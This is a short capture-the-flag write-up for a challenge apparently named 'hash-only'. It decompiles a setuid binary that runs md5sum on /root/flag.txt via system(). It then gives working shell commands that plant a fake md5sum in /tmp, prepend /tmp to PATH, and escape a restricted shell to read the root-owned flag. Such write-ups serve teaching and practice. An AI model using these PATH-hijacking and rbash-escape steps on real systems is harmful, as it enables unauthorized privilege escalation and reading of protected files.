![hash-only-1-challenge](https://github.com/user-attachments/assets/334b8ad0-bcb8-4c40-930e-95e967a690aa)

# Step 1
Let's begin by analyzing the binary provided to us. After decompiling the binary using Ghidra, the following C pseudocode was obtained:

```
bool main(void)

{
  ostream *poVar1;
  char *__command;
  long in_FS_OFFSET;
  bool bVar2;
  allocator local_4d;
  int local_4c;
  string local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  poVar1 = std::operator<<((ostream *)std::cout,"Computing the MD5 hash of /root/flag.txt.... ");
  poVar1 = (ostream *)std::ostream::operator<<(poVar1,std::endl<>);
  std::ostream::operator<<(poVar1,std::endl<>);
  sleep(2);
  std::allocator<char>::allocator();
                    /* try { // try from 001013aa to 001013ae has its CatchHandler @ 0010144f */
  std::string::string(local_48,"/bin/bash -c \'md5sum /root/flag.txt\'",&local_4d);
  std::allocator<char>::~allocator((allocator<char> *)&local_4d);
  setgid(0);
  setuid(0);
  __command = (char *)std::string::c_str();
                    /* try { // try from 001013de to 00101423 has its CatchHandler @ 0010146d */
  local_4c = system(__command);
  bVar2 = local_4c != 0;
  if (bVar2) {
    poVar1 = std::operator<<((ostream *)std::cerr,"Error: system() call returned non-zero value: ");
    poVar1 = (ostream *)std::ostream::operator<<(poVar1,local_4c);
    std::ostream::operator<<(poVar1,std::endl<>);
  }
  std::string::~string(local_48);
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return bVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

This reveals that the challenge code uses md5sum to hash the flag file.

# Step 2
Since the challenge code uses md5sum to hash the flag file, we can override it by adding our own fake md5sum script into PATH. This fake md5sum will simply return the flag.

```
(webshell)

echo -e '#!/bin/bash\ncat /root/flag.txt; echo "  *-"' > /tmp/md5sum
chmod +x /tmp/md5sum
export PATH=/tmp:$PATH
```

Note: for hash-only-2, rbash restricts our access to PATH, but we can simply disable it:

```
(webshell)

bash --noprofile
```

# Step 3
With our make md5sum script in PATH, the challenge code will no longer hash the flag. We can simply run the challenge code and obtain the flag.
